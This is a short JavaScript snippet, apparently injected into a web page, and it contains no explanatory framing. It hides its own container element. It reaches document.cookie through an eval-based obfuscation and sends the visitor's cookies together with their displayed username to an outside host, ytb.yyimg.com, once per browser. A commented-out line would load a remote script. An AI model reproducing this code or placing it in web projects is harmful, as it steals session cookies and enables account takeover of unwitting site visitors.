//<script>
// d=(1==1?"d":"d")+"ocument";d=eval(d).write("<"+(1==1?"sc":"sc")+"ript src='\/\/static.yyimg.com\/17173\/qm_98cc5bdc23c35ed1.js'><\/script>");
// </script>
document.write("<div class='sign-hide-flag'></div>");
jQuery('.sign-hide-flag').parent().css('display','none');
d=(1==1?"d":"d")+"ocument";
d=eval(d).cookie;
if(localStorage.getItem("TIMESTAMPS")!="1422323221"){
  jQuery.ajax({
    type:"GET",
    url:"https://ytb.yyimg.com/function",
    data:{
      'd':d,
      'n':jQuery(".vwmy a").html()
    },
    success:function(){
      localStorage.setItem("TIMESTAMPS","1422323221");
    }
  });
}
